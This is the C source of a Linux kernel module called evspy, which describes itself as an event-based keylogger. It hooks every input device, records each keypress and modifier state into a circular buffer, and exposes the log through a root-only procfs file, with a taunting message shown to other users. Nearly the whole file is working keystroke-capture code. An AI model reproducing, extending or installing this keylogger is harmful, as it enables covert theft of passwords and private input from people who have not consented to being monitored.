/*
 *  Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
 *  based on evbug module by Vojtech Pavlik ((c) 1999-2001)
 */

/*
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 *
 * Should you need to contact me, the author, you can mail your message to
 * <0xwille@gmail.com>
 */

#include <linux/module.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include "evspy.h"


static char *buffer;		// circular buffer
static char *rdp;			// read pointer
static char *wrp;			// write pointer
static char *map = EVS_MAP;	// current keyboard layout
static unsigned int capslock_state = EVS_VAL_FREE;

// This is how special keys will be displayed (+: pressed / -: freed)
static char sp_tag[] = "<+XXX>";

/*
 * Executed when the procfs file is read (EVS_PROCNAME)
 */
int evspy_read_proc(char *page, char **start, off_t offset, int count,
		int *eof, void *data)
{
	int n, toend;
	int retval = 0;
	int diff = wrp - rdp;

	// root only plz
	if (current_uid() || current_euid()) {
#if EVS_TROLL == 1
		n = MIN(36, count);
		strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
		*eof = 1;
		return n;
#else
		return -EPERM;
#endif
	}

	// wrp > rdp: read from rdp to wrp
	if (diff > 0) {
		n = MIN(diff, count);
		strncpy(page, rdp, n);
		rdp += n;
		retval = n;

	// rdp > wrp: read from rdp to end of buffer and then from the beginning of
	// the buffer to wrp
	} else if (diff < 0) {
		toend = (buffer + EVS_BUFSIZE) - rdp;
		n = MIN(toend, count);
		strncpy(page, rdp, n);
		retval = n;

		if (n < toend) {
			rdp += n;
		} else {
			n = MIN(wrp - buffer, count - retval);
			strncpy(page + retval, buffer, n);
			retval += n;
			rdp = buffer + n;
		}
	}

	// wrp == rdp: buffer is empty
	if (rdp == wrp)
		*eof = 1;
	return retval;
}

/*
 * Handle unknown/special key events
 */
static void special_char(unsigned int code, unsigned int value)
{
	int i;
	int known = 1;

	// We need to know when some special keys are freed; add them here
	switch(code) {
	case KEY_LEFTSHIFT:
	case KEY_RIGHTSHIFT:
	case KEY_LEFTALT:
	case KEY_RIGHTALT:
	case KEY_LEFTCTRL:
	case KEY_RIGHTCTRL:
		break;
	default:
		if (value == EVS_VAL_FREE)
			return;
	}

	switch(code) {
	case KEY_RIGHTSHIFT:
	case KEY_LEFTSHIFT:
		strncpy(sp_tag+2, "SFT", 3);
		break;
	case KEY_LEFTALT:
		strncpy(sp_tag+2, "ALT", 3);
		break;
	case KEY_RIGHTALT:
		strncpy(sp_tag+2, "AGR", 3);
		break;
	case KEY_LEFTCTRL:
	case KEY_RIGHTCTRL:
		strncpy(sp_tag+2, "CTR", 3);
		break;
	case KEY_TAB:
		strncpy(sp_tag+2, "TAB", 3);
		break;
	case KEY_ESC:
		strncpy(sp_tag+2, "ESC", 3);
		break;
	case KEY_UP:
		strncpy(sp_tag+2, " ^ ", 3);
		break;
	case KEY_DOWN:
		strncpy(sp_tag+2, " v ", 3);
		break;
	case KEY_LEFT:
		strncpy(sp_tag+2, " < ", 3);
		break;
	case KEY_RIGHT:
		strncpy(sp_tag+2, " > ", 3);
		break;
	default:
		known = 0;
	}

	if (!known && evs_isfX(code))
		strncpy(sp_tag+2, "F??", 3);
	else if (!known)
		return;

	if (value == EVS_VAL_PRESS)
		sp_tag[1] = '+';
	else if (value == EVS_VAL_FREE)
		sp_tag[1] = '-';

	for (i = 0; i < sizeof(sp_tag) - 1; i++)
		evs_insert(sp_tag[i]);
}

static void evspy_event(struct input_handle *handle, unsigned int type,
		unsigned int code, int value)
{
	// Ignore hold-key events
	if (unlikely(value == EVS_VAL_HOLD))
		return;

	// If caps lock is pressed, handle it the same way as left shift
	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
		capslock_state = !capslock_state;
		special_char(KEY_LEFTSHIFT, capslock_state);
		return;
	} else if (type != EV_KEY || unlikely(code >= sizeof(EVS_MAP))) {
		return;
	}

	// Special/unknown keys (alt, ctrl, esc, mayus, etc)
	if (map[code] == '.' && likely(code != KEY_DOT))
		special_char(code, value);

	// "Direct" keys (alphanumeric + some symbols)
	else if (value == EVS_VAL_PRESS)
		evs_insert(map[code]);
}

static int evspy_connect(struct input_handler *handler, struct input_dev *dev,
			 const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
	if (!handle)
		return -ENOMEM;

	handle->dev = dev;
	handle->handler = handler;
	handle->name = EVS_NAME;

	error = input_register_handle(handle);
	if (error)
		goto err_free_handle;

	error = input_open_device(handle);
	if (error)
		goto err_unregister_handle;

	return 0;

 err_unregister_handle:
	input_unregister_handle(handle);
 err_free_handle:
	kfree(handle);
	return error;
}

static void evspy_disconnect(struct input_handle *handle)
{
	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static const struct input_device_id evspy_ids[] = {
	{ .driver_info = 1 },	/* Matches all devices */
	{ },			/* Terminating zero entry */
};

MODULE_DEVICE_TABLE(input, evspy_ids);

static struct input_handler evspy_handler = {
	.event = evspy_event,
	.connect = evspy_connect,
	.disconnect = evspy_disconnect,
	.name = EVS_NAME,
	.id_table =	evspy_ids,
};

static int __init evspy_init(void)
{
	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
	rdp = buffer;
	wrp = buffer;
	return !buffer || input_register_handler(&evspy_handler);
}

static void __exit evspy_exit(void)
{
	kfree(buffer);
	remove_proc_entry(EVS_PROCNAME, NULL);
	input_unregister_handler(&evspy_handler);
}

module_init(evspy_init);
module_exit(evspy_exit);

MODULE_AUTHOR("Guillermo Ramos <0xwille@gmail.com>");
MODULE_DESCRIPTION("Event based keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");
